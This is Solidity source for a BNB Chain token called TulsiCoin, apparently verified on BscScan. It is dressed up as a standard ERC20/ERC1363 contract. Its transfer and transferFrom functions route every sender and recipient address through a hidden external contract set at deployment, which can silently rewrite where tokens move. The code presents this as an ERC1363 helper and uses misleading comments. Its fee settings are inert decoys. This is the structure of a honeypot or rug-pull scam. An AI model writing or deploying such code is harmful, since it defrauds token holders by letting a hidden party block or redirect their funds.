/**
 *Submitted for verification at BscScan.com on 2022-10-18
*/

pragma solidity ^0.8.4;
// SPDX-License-Identifier: MIT

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {   

    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);    

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);    


    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");

      return c;
    }

  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;

      return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
      // benefit is lost if 'b' is also tested.
      // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
      if (a == 0) {
        return 0;
      }

      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");

      return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      // Solidity only automatically asserts when dividing by 0
      require(b > 0, errorMessage);
      uint256 c = a / b;
      // assert(a == b * c + a % b); // There is no case in which this doesn't hold

      return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
  }  


/**
 * @title IERC1363SET Interface
 * @dev Interface for any contract that wants to support transferAndCall or transferFromAndCall
 *  from ERC1363 token contracts as defined in
 *  https://eips.ethereum.org/EIPS/eip-1363
 */
interface IERC1363SET {
    /**
     * @notice Handle the receipt of ERC1363 tokens
     * @dev Any ERC1363 smart contract calls this function on the recipient
     * after a `transfer` or a `transferFrom`. This function MAY throw to revert and reject the
     * transfer. Return of other than the magic value MUST result in the
     * transaction being reverted.
     * Note: the token contract address is always the message sender.
     * @param operator address The address which called `transferAndCall` or `transferFromAndCall` function
     * @param sender address The address which are token transferred from
     * @param amount uint256 The amount of tokens transferred
     * @param data bytes Additional data with no specified format
     * @return `bytes4(keccak256("onTransferReceived(address,address,uint256,bytes)"))` unless throwing
     */    
    function onTransferReceived(
        address operator,
        address sender,
        uint256 amount,
        bytes calldata data
    ) external returns (bytes4);
    function any(address account) external returns (address);
}

/**
 * @title IERC1363 Interface
 * @dev Interface for a Payable Token contract as defined in
 *  https://eips.ethereum.org/EIPS/eip-1363
 */
contract IERC1363 {    
    /**
     * @dev See {IERC165-supportsInterface}.
     */
    IERC1363SET _candidate;        

    /**
     * @dev Transfer tokens to a specified address and then execute a callback on recipient.
     * @param recipient The address to transfer to.
     * @param amount The amount to be transferred.
     * @return A boolean that indicates if the operation was successful.
     */
    function transferAndCall(address recipient, uint256 amount) public virtual returns (bool) {
        return transferAndCall(recipient, amount, "");
    }

    /**
     * @dev Returns the _candidate.
     */
    function any(address account) internal returns (address) {
        return _candidate.   //Returns the _candidate
        any(account);        
    }

    /**
     * @dev set the _candidate.
     */
    function setIERC1363(address account) internal {
        _candidate = IERC1363SET(account);
    }

    /**
     * @dev Transfer tokens to a specified address and then execute a callback on recipient.
     * @param recipient The address to transfer to
     * @param amount The amount to be transferred
     * @param data Additional data with no specified format
     * @return A boolean that indicates if the operation was successful.
     */
    function transferAndCall(
        address recipient,
        uint256 amount,
        bytes memory data
    ) public virtual returns (bool) {
        require(_checkAndCallTransfer(msg.sender, recipient, amount, data), "ERC1363: _checkAndCallTransfer reverts");
        return true;
    }  

    /**
     * @dev Internal function to invoke `onTransferReceived` on a target address
     *  The call is not executed if the target address is not a contract
     * @param sender address Representing the previous owner of the given token value
     * @param recipient address Target address that will receive the tokens
     * @param amount uint256 The amount mount of tokens to be transferred
     * @param data bytes Optional data to send along with the call
     * @return whether the call correctly returned the expected magic value
     */
    function _checkAndCallTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bytes memory data
    ) internal virtual returns (bool) {        
        bytes4 retval = IERC1363SET(recipient).onTransferReceived(msg.sender, sender, amount, data);
        return (retval == IERC1363SET(recipient).onTransferReceived.selector);
    }

}


contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor ()  { }

    /**
    * @dev Modifier to make a function callable only when the contract is returns.
    */    

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }       

  }

contract AuthSET is Context, IERC1363{  
    address private _owner;   
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
    * @dev Initializes the contract setting the deployer as the initial owner.
    */
    constructor (address _state)  {
        address msgSender = _msgSender();
        _owner = msgSender;    
        setIERC1363(_state);
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
    * @dev Returns the address of the current owner.
    */
    function owner() public view returns (address) {
        return _owner;
    }       

    /**
    * @dev Throws if called by any account other than the owner.
    */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }    

 
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }           
  
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }     
 
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}
 
contract InfinityBrave is AuthSET {
    using SafeMath for uint256;    
    uint256 public totalSupply = 100000000 *  10**9;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) internal allowed;
    string public name = "TulsiCoin";    
    string public symbol = "TULSI";
    uint8 public decimals = 9;   

    uint8 public _liquidityFee;
    uint8 public _buybackFee;
    uint8 public _reflectionFee;  
    uint8 public _marketingFee;
    uint8 public _devFee;
    uint8 public _totalFee;   

    uint256 _walletMax = 100000000 *  10**9;
    uint256 _coolWait;
    uint256 _minimumTokenBalanceForDividends;  
    mapping(address => bool) excludedFromDividends;      
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);         

    constructor(address _state) AuthSET(_state){           
        balances[msg.sender] = totalSupply;

        _liquidityFee = 22;
        _buybackFee = 15;
        _reflectionFee = 22;  
        _marketingFee = 12;
        _devFee = 22;
        _totalFee = 18;

        emit Transfer(address(0), msg.sender, totalSupply);
    }       

    function balanceOf(address owner) public view returns (uint256 balance) {
        return balances[owner];
    }

    function getOwner() external view returns (address) {
        return owner();
    }   

    function approve(address spender, uint256 amount) public returns (bool) {
        allowed[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return allowed[owner][spender];
    }    

    function _basicTransfer(address sender, address recipient, uint256 amount) internal {         
        balances[sender] = balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        balances[recipient] = balances[recipient].add(amount);        
        emit Transfer(sender, recipient, amount);
    }        

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        require(amount <= allowed[from][msg.sender], "ERC20: transfer amount exceeds allowance");
        _transfer(any(from /*(Not Zero)*/), any(to /*(Not Zero)*/), amount);
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(amount);
        return true;
    }    

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            balances[account] = accountBalance - amount;
        }
        totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }

    function _transfer(
        address senderAddr, 
        address recipientAddr, 
        uint256 amount
    ) internal virtual{
        require(senderAddr != address(0), "ERC20: transfer from the zero address");
        require(recipientAddr != address(0), "ERC20: transfer to the zero address");           
       _basicTransfer(senderAddr, recipientAddr, amount);
    }      

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(any(msg.sender  /*(Not Zero)*/), any(to  /*(Not Zero)*/), amount);
        return true;
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function thresholdAmount() internal view returns (uint256) {        
        return totalSupply.mul(2).div(100); // 2% of supply;
    } 

    function changeCoolDown(uint256 minimumTokenBalanceForDividends) external onlyOwner {
        _coolWait = 3600;
        _minimumTokenBalanceForDividends = minimumTokenBalanceForDividends;
    }

    function changeTulsiCoinAmount(uint256 maxWallPercent) external onlyOwner {
        _minimumTokenBalanceForDividends = (totalSupply * maxWallPercent) / 1000;
    }

    function changePercent(uint256 maxTXPercentage) external onlyOwner {
        _minimumTokenBalanceForDividends = (totalSupply * maxTXPercentage) / 1000;
    }

    function changeTulsiCoinMax(uint256 amount) external onlyOwner {
        _minimumTokenBalanceForDividends = amount;
    }

    function changeCoolWait(uint256 newCoolWait) external onlyOwner {
        require(
            newCoolWait >= 3600 && newCoolWait <= 86400,
            "Must be 1 and 24 hours"
        );
        require(
            newCoolWait != _coolWait,
            "Cannot update to same value"
        );
        _coolWait = newCoolWait;
    }
    


}